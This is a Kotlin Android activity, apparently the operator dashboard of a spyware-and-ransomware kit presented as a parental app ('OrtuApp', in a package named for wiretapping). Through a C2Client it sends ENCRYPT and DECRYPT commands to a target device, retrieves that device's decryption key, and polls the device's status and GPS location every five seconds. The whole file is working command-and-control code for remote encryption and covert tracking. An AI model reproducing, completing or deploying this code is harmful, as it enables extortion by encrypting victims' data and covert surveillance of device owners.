package com.sadap.ortuapp.ui

import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.widget.Button
import android.widget.EditText
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import com.sadap.ortuapp.R
import com.sadap.template.network.C2Client
import org.json.JSONObject

class DashboardScreen : AppCompatActivity() {

    private lateinit var deviceIdEditText: EditText
    private lateinit var statusTextView: TextView
    private lateinit var encryptionKeyTextView: TextView
    private lateinit var locationTextView: TextView

    private val handler = Handler(Looper.getMainLooper())
    private val statusRefresher = object : Runnable {
        override fun run() {
            getDeviceStatus()
            handler.postDelayed(this, 5 * 1000) // Refresh status setiap 5 detik
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_dashboard)

        deviceIdEditText = findViewById(R.id.deviceIdEditText)
        statusTextView = findViewById(R.id.statusTextView)
        encryptionKeyTextView = findViewById(R.id.encryptionKeyTextView)
        locationTextView = findViewById(R.id.locationTextView)

        val btnEncrypt: Button = findViewById(R.id.btnEncrypt)
        val btnDecrypt: Button = findViewById(R.id.btnDecrypt)
        val btnGetKey: Button = findViewById(R.id.btnGetKey)
        val btnPing: Button = findViewById(R.id.btnPing)
        val btnGetStatus: Button = findViewById(R.id.btnGetStatus)

        btnEncrypt.setOnClickListener { sendCommand("ENCRYPT", null) }
        btnDecrypt.setOnClickListener {
            val key = encryptionKeyTextView.text.toString()
            if (key.isEmpty() || key == "N/A") {
                Toast.makeText(this, "Silakan ambil kunci akses terlebih dahulu.", Toast.LENGTH_SHORT).show()
            } else {
                sendCommand("DECRYPT", key)
            }
        }
        btnGetKey.setOnClickListener { retrieveEncryptionKey() }
        btnPing.setOnClickListener { sendCommand("PING", null) }
        btnGetStatus.setOnClickListener { getDeviceStatus() }

        // Mulai refresh status otomatis
        handler.post(statusRefresher)
    }

    override fun onDestroy() {
        super.onDestroy()
        handler.removeCallbacks(statusRefresher)
    }

    private fun sendCommand(command: String, keyForDecryption: String?) {
        val deviceId = deviceIdEditText.text.toString().trim()
        if (deviceId.isEmpty()) {
            Toast.makeText(this, "Harap masukkan Device ID.", Toast.LENGTH_SHORT).show()
            return
        }

        val json = JSONObject().apply {
            put("device_id", deviceId)
            put("command", command)
            keyForDecryption?.let { put("key_for_decryption", it) }
        }

        Thread {
            val response = C2Client.post("/send_command", json)
            runOnUiThread {
                if (response != null && response.contains("Perintah diatur")) {
                    Toast.makeText(this, "Perintah '$command' berhasil dikirim.", Toast.LENGTH_SHORT).show()
                } else {
                    Toast.makeText(this, "Gagal mengirim perintah. Respons: $response", Toast.LENGTH_LONG).show()
                }
            }
        }.start()
    }

    private fun retrieveEncryptionKey() {
        val deviceId = deviceIdEditText.text.toString().trim()
        if (deviceId.isEmpty()) {
            Toast.makeText(this, "Harap masukkan Device ID.", Toast.LENGTH_SHORT).show()
            return
        }

        Thread {
            val response = C2Client.get("/get_key", mapOf("device_id" to deviceId))
            runOnUiThread {
                if (response != null) {
                    try {
                        val json = JSONObject(response)
                        val key = json.optString("encryption_key", "N/A")
                        encryptionKeyTextView.text = "Kunci Akses: $key"
                        Toast.makeText(this, "Kunci akses berhasil diambil.", Toast.LENGTH_SHORT).show()
                    } catch (e: Exception) {
                        Log.e("OrtuApp", "JSON parsing error for key: ${e.message}")
                        Toast.makeText(this, "Gagal memproses kunci akses.", Toast.LENGTH_LONG).show()
                    }
                } else {
                    Toast.makeText(this, "Gagal mengambil kunci akses.", Toast.LENGTH_LONG).show()
                }
            }
        }.start()
    }

    private fun getDeviceStatus() {
        val deviceId = deviceIdEditText.text.toString().trim()
        if (deviceId.isEmpty()) {
            // Toast.makeText(this, "Harap masukkan Device ID.", Toast.LENGTH_SHORT).show() // Jangan spam jika kosong
            statusTextView.text = "Status Perangkat: Masukkan Device ID."
            return
        }

        Thread {
            val response = C2Client.get("/get_status", mapOf("device_id" to deviceId))
            runOnUiThread {
                if (response != null) {
                    try {
                        val json = JSONObject(response)
                        val status = json.optString("status", "N/A")
                        val lastSeen = json.optString("last_seen", "N/A")
                        val location = json.optJSONObject("current_location")

                        statusTextView.text = "Status: $status\nTerakhir Terlihat: $lastSeen"
                        if (location != null) {
                            val lat = location.optString("latitude", "N/A")
                            val lon = location.optString("longitude", "N/A")
                            val locTime = location.optString("timestamp", "N/A")
                            locationTextView.text = "Lokasi: Lat $lat, Lon $lon\nUpdate: $locTime"
                        } else {
                            locationTextView.text = "Lokasi: N/A"
                        }
                    } catch (e: Exception) {
                        Log.e("OrtuApp", "JSON parsing error for status: ${e.message}")
                        statusTextView.text = "Status Perangkat: Gagal memproses."
                        locationTextView.text = "Lokasi: Gagal memproses."
                    }
                } else {
                    statusTextView.text = "Status Perangkat: Gagal mengambil."
                    locationTextView.text = "Lokasi: Gagal mengambil."
                }
            }
        }.start()
    }
}
